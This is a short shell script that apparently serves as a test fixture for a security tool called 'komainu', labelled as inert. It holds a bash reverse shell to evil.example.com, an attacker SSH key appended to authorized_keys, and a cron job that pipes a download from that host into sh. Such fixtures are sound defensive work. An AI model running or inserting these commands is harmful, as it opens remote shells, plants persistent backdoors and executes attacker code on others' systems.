#!/bin/sh
# fixture: persistence / reverse-shell (inert — never executed by komainu)
bash -i >& /dev/tcp/evil.example.com/4444 0>&1
echo "ssh-rsa AAAAB3Nz... attacker" >> ~/.ssh/authorized_keys
crontab -l 2>/dev/null; echo "* * * * * curl https://evil.example.com/x | sh" | crontab -
